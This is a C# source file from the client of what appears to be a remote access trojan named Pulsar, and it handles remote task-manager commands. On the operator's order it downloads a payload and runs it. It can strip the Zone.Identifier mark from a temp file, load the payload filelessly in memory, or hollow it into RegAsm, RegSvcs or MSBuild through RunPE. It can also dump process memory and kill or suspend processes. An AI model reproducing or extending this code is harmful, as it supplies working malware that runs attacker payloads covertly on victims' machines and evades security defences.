using Pulsar.Client.Networking;
using Pulsar.Client.Setup;
using Pulsar.Client.Helper;
using Pulsar.Common;
using Pulsar.Common.Enums;
using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Administration.TaskManager;
using Pulsar.Common.Messages.Other;
using Pulsar.Common.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Reflection;
using System.Threading;
using System.Runtime.InteropServices;

namespace Pulsar.Client.Messages
{
    /// <summary>
    /// Handles messages for the interaction with tasks.
    /// </summary>
    public class TaskManagerHandler : IMessageProcessor, IDisposable
    {
        private readonly PulsarClient _client;
        private readonly WebClient _webClient;

        public TaskManagerHandler(PulsarClient client)
        {
            _client = client;
            _client.ClientState += OnClientStateChange;
            _webClient = new WebClient { Proxy = null };
            _webClient.DownloadDataCompleted += OnDownloadDataCompleted;
        }

        private void OnClientStateChange(Networking.Client s, bool connected)
        {
            if (!connected && _webClient.IsBusy)
            {
                _webClient.CancelAsync();
            }
        }

        public bool CanExecute(IMessage message) => message is GetProcesses ||
                                                   message is DoProcessStart ||
                                                   message is DoProcessEnd ||
                                                   message is DoProcessDump ||
                                                   message is DoSetTopMost ||
                                                   message is DoSuspendProcess ||
                                                   message is DoSetWindowState;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case GetProcesses msg:
                    Execute(sender, msg);
                    break;
                case DoProcessStart msg:
                    Execute(sender, msg);
                    break;
                case DoProcessEnd msg:
                    Execute(sender, msg);
                    break;
                case DoProcessDump msg:
                    Execute(sender, msg);
                    break;
                case DoSuspendProcess msg:
                    Execute(sender, msg);
                    break;
                case DoSetTopMost msg:
                    Execute(sender, msg);
                    break;
                case DoSetWindowState msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void SendStatus(string message)
        {
            try { _client.Send(new SetStatus { Message = message }); }
            catch { /* ignore failures */ }
        }

        private void Execute(ISender client, DoSetWindowState message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc == null || proc.MainWindowHandle == IntPtr.Zero)
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = false });
                    SendStatus($"SetWindowState failed: PID {message.Pid} not found or has no main window");
                    return;
                }

                int nCmd = message.Minimize ? 6 /*SW_MINIMIZE*/ : 9 /*SW_RESTORE*/;
                bool result = Utilities.NativeMethods.ShowWindow(proc.MainWindowHandle, nCmd);

                client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = result });
                SendStatus($"Window {(message.Minimize ? "minimized" : "restored")} for PID {message.Pid}");
            }
            catch
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.None, Result = false });
                SendStatus($"SetWindowState failed for PID {message.Pid}");
            }
        }
        private void Execute(ISender client, DoSetTopMost message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc == null || proc.MainWindowHandle == IntPtr.Zero)
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
                    SendStatus($"SetTopMost failed: PID {message.Pid} not found or has no main window");
                    return;
                }

                const int HWND_TOPMOST = -1;
                const int HWND_NOTOPMOST = -2;
                const uint SWP_NOSIZE = 0x0001;
                const uint SWP_NOMOVE = 0x0002;
                const uint SWP_SHOWWINDOW = 0x0040;

                Utilities.NativeMethods.SetForegroundWindow(proc.MainWindowHandle);
                if (Utilities.NativeMethods.IsIconic(proc.MainWindowHandle))
                    Utilities.NativeMethods.ShowWindow(proc.MainWindowHandle, 9);

                IntPtr hWndInsertAfter = new IntPtr(message.Enable ? HWND_TOPMOST : HWND_NOTOPMOST);
                bool result = Utilities.NativeMethods.SetWindowPos(
                    proc.MainWindowHandle,
                    hWndInsertAfter,
                    0, 0, 0, 0,
                    SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW
                );

                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = result });
                SendStatus($"TopMost {(message.Enable ? "enabled" : "disabled")} for PID {message.Pid}");
            }
            catch
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.SetTopMost, Result = false });
                SendStatus($"SetTopMost failed for PID {message.Pid}");
            }
        }

        private void Execute(ISender client, GetProcesses message)
        {
            Process[] pList = Process.GetProcesses();
            var processes = new Common.Models.Process[pList.Length];
            var parentMap = GetParentProcessMap();

            for (int i = 0; i < pList.Length; i++)
            {
                processes[i] = new Common.Models.Process
                {
                    Name = pList[i].ProcessName + ".exe",
                    Id = pList[i].Id,
                    MainWindowTitle = pList[i].MainWindowTitle,
                    ParentId = parentMap.TryGetValue(pList[i].Id, out var parentId) ? parentId : null
                };
            }

            int currentPid = Process.GetCurrentProcess().Id;
            client.Send(new GetProcessesResponse { Processes = processes, RatPid = currentPid });
        }

        private void Execute(ISender client, DoProcessStart message)
        {
            SendStatus($"Starting process: {message.FilePath ?? message.DownloadUrl}");
            if (string.IsNullOrEmpty(message.FilePath) && (message.FileBytes == null || message.FileBytes.Length == 0))
            {
                if (string.IsNullOrEmpty(message.DownloadUrl))
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus("Process start failed: No file path or download URL");
                    return;
                }

                try
                {
                    if (_webClient.IsBusy) { _webClient.CancelAsync(); while (_webClient.IsBusy) Thread.Sleep(50); }
                    _webClient.DownloadDataAsync(new Uri(message.DownloadUrl), message);
                }
                catch
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus("Process start failed: Download error");
                }
            }
            else
            {
                ExecuteProcess(message.FileBytes, message.FilePath, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
            }
        }

        private void OnDownloadDataCompleted(object sender, DownloadDataCompletedEventArgs e)
        {
            var message = (DoProcessStart)e.UserState;
            if (e.Cancelled || e.Error != null)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus("Process start failed: Download cancelled or error");
                return;
            }
            ExecuteProcess(e.Result, null, message.IsUpdate, message.ExecuteInMemoryDotNet, message.UseRunPE, message.RunPETarget, message.RunPECustomPath, message.FileExtension);
        }

        private void ExecuteProcess(byte[] fileBytes, string filePath, bool isUpdate, bool executeInMemory = false, bool useRunPE = false, string runPETarget = null, string runPECustomPath = null, string fileExtension = null)
        {
            if (fileBytes == null && !string.IsNullOrEmpty(filePath) && File.Exists(filePath))
                fileBytes = File.ReadAllBytes(filePath);

            if (fileBytes == null || fileBytes.Length == 0)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus("Process start failed: no file bytes available");
                return;
            }

            if (isUpdate)
            {
                try
                {
                    string tempPath = FileHelper.GetTempFilePath(".exe");
                    File.WriteAllBytes(tempPath, fileBytes);
                    new ClientUpdater().Update(tempPath);
                    _client.Exit();
                }
                catch (Exception ex) { SendStatus($"Update failed: {ex.Message}"); }
            }
            else
            {
                try
                {
                    if (useRunPE) { ExecuteViaRunPE(fileBytes, runPETarget, runPECustomPath); return; }
                    if (executeInMemory) { ExecuteViaInMemoryDotNet(fileBytes); return; }
                    ExecuteViaTemporaryFile(fileBytes, fileExtension);
                }
                catch (Exception ex)
                {
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus($"Process start failed: {ex.Message}");
                }
            }
        }

        private void ExecuteViaRunPE(byte[] fileBytes, string runPETarget, string runPECustomPath)
        {
            new Thread(() =>
            {
                try
                {
                    bool is64 = IsPayload64Bit(fileBytes);
                    string hostPath = GetRunPEHostPath(runPETarget, runPECustomPath, is64);
                    if (string.IsNullOrEmpty(hostPath)) { SendStatus("RunPE failed: host path not found"); return; }

                    bool result = Helper.RunPE.Execute(hostPath, fileBytes);
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = result });
                    SendStatus($"RunPE execution {(result ? "succeeded" : "failed")}");
                }
                catch (Exception ex)
                {
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus($"RunPE failed: {ex.Message}");
                }
            }).Start();
        }

        private void ExecuteViaInMemoryDotNet(byte[] fileBytes)
        {
            new Thread(() =>
            {
                try
                {
                    Assembly asm = Assembly.Load(fileBytes);
                    MethodInfo entry = asm.EntryPoint;
                    if (entry != null)
                        entry.Invoke(null, entry.GetParameters().Length == 0 ? null : new object[] { new string[0] });
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                    SendStatus(".NET in-memory execution succeeded");
                }
                catch (Exception ex)
                {
                    _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                    SendStatus($".NET in-memory execution failed: {ex.Message}");
                }
            }).Start();
        }

        private void ExecuteViaTemporaryFile(byte[] fileBytes, string fileExtension)
        {
            try
            {
                string tempPath = FileHelper.GetTempFilePath(fileExtension ?? ".exe");
                File.WriteAllBytes(tempPath, fileBytes);
                FileHelper.DeleteZoneIdentifier(tempPath);

                Process.Start(new ProcessStartInfo { UseShellExecute = true, FileName = tempPath });
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = true });
                SendStatus("Process executed via temporary file");
            }
            catch (Exception ex)
            {
                _client.Send(new DoProcessResponse { Action = ProcessAction.Start, Result = false });
                SendStatus($"Temporary file execution failed: {ex.Message}");
            }
        }

        private string GetRunPEHostPath(string target, string customPath, bool is64)
        {
            string winDir = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
            string frameworkDir = is64
                ? Path.Combine(winDir, "Microsoft.NET", "Framework64", "v4.0.30319")
                : Path.Combine(winDir, "Microsoft.NET", "Framework", "v4.0.30319");

            if (!Directory.Exists(frameworkDir))
                frameworkDir = System.Runtime.InteropServices.RuntimeEnvironment.GetRuntimeDirectory();

            switch (target)
            {
                case "a": return Path.Combine(frameworkDir, "RegAsm.exe");
                case "b": return Path.Combine(frameworkDir, "RegSvcs.exe");
                case "c": return Path.Combine(frameworkDir, "MSBuild.exe");
                case "d": return customPath;
                default: return Path.Combine(frameworkDir, "RegAsm.exe");
            }
        }

        private bool IsPayload64Bit(byte[] payload)
        {
            try
            {
                if (payload.Length < 0x40 || payload[0] != 'M' || payload[1] != 'Z') return false;
                int peOffset = BitConverter.ToInt32(payload, 0x3C);
                if (peOffset + 6 > payload.Length) return false;
                return BitConverter.ToUInt16(payload, peOffset + 4) == 0x8664;
            }
            catch { return false; }
        }

        private Dictionary<int, int?> GetParentProcessMap()
        {
            var map = new Dictionary<int, int?>();
            try
            {
                using (var searcher = new ManagementObjectSearcher("SELECT ProcessId, ParentProcessId FROM Win32_Process"))
                using (var results = searcher.Get())
                {
                    foreach (ManagementObject obj in results)
                    {
                        if (obj["ProcessId"] is uint pidValue)
                        {
                            int pid = unchecked((int)pidValue);
                            int? parent = obj["ParentProcessId"] is uint pVal && pVal > 0 && pVal != pid ? (int?)pVal : null;
                            map[pid] = parent;
                        }
                        obj?.Dispose();
                    }
                }
            }
            catch { }
            return map;
        }

        private void Execute(ISender client, DoProcessEnd message)
        {
            try
            {
                Process.GetProcessById(message.Pid).Kill();
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = true });
                SendStatus($"Process PID {message.Pid} killed");
            }
            catch
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.End, Result = false });
                SendStatus($"Failed to kill process PID {message.Pid}");
            }
        }

        private void Execute(ISender client, DoProcessDump message)
        {
            string dump;
            bool success;
            Process proc = Process.GetProcessById(message.Pid);
            (dump, success) = DumpHelper.GetProcessDump(message.Pid);
            if (success)
            {
                FileInfo info = new FileInfo(dump);
                client.Send(new DoProcessDumpResponse { Result = true, DumpPath = dump, Length = info.Length, Pid = message.Pid, ProcessName = proc.ProcessName, FailureReason = "", UnixTime = DateTime.Now.Ticks });
                SendStatus($"Dump completed for PID {message.Pid}");
            }
            else
            {
                client.Send(new DoProcessDumpResponse { Result = false, DumpPath = "", Length = 0, Pid = message.Pid, ProcessName = proc.ProcessName, FailureReason = dump, UnixTime = DateTime.Now.Ticks });
                SendStatus($"Dump failed for PID {message.Pid}: {dump}");
            }
        }

        private void Execute(ISender client, DoSuspendProcess message)
        {
            try
            {
                Process proc = Process.GetProcessById(message.Pid);
                if (proc != null)
                {
                    Utilities.NativeMethods.NtSuspendProcess(proc.Handle);
                    client.Send(new DoProcessResponse { Action = ProcessAction.Suspend, Result = true });
                    SendStatus($"Process PID {message.Pid} suspended");
                }
                else
                {
                    client.Send(new DoProcessResponse { Action = ProcessAction.Suspend, Result = false });
                    SendStatus($"Suspend failed: PID {message.Pid} not found");
                }
            }
            catch
            {
                client.Send(new DoProcessResponse { Action = ProcessAction.Suspend, Result = false });
                SendStatus($"Suspend failed: PID {message.Pid}");
            }
        }

        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected virtual void Dispose(bool disposing)
        {
            if (disposing)
            {
                _client.ClientState -= OnClientStateChange;
                _webClient.DownloadDataCompleted -= OnDownloadDataCompleted;
                _webClient.CancelAsync();
                _webClient.Dispose();
            }
        }
    }
}
